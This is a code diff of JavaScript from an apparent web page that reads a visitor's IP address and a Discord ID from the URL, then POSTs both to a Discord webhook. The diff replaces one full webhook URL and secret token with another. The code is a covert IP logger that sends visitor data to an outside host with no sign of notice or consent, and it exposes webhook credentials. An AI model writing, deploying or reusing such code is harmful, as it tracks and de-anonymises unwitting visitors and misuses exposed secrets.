@@ -12,7 +12,7 @@
             const ip = await response.json();
             const discordId = new URLSearchParams(window.location.search).get("id");
             if (discordId) {
-                await fetch("https://discord.com/api/webhooks/1335357251082518700/-zluXm4U386F4xsxtKobIDFLCPHF5YfN4htVGVmepp2ZOf6bAUrpxfl4sxhjQBL95zv6", {
+                await fetch("https://discord.com/api/webhooks/1335366773389791255/qMh5D36yAImnM_TKrl2hOV8_ViubBjkBmzZwrYR9SWmwRDHt0nPfDWfw9tRaR-3aUKPg", {
                     method: "POST",
                     headers: { "Content-Type": "application/json" },
                     body: JSON.stringify({ content: `{"id": "${discordId}", "ip": "${ip.ip}"}` })
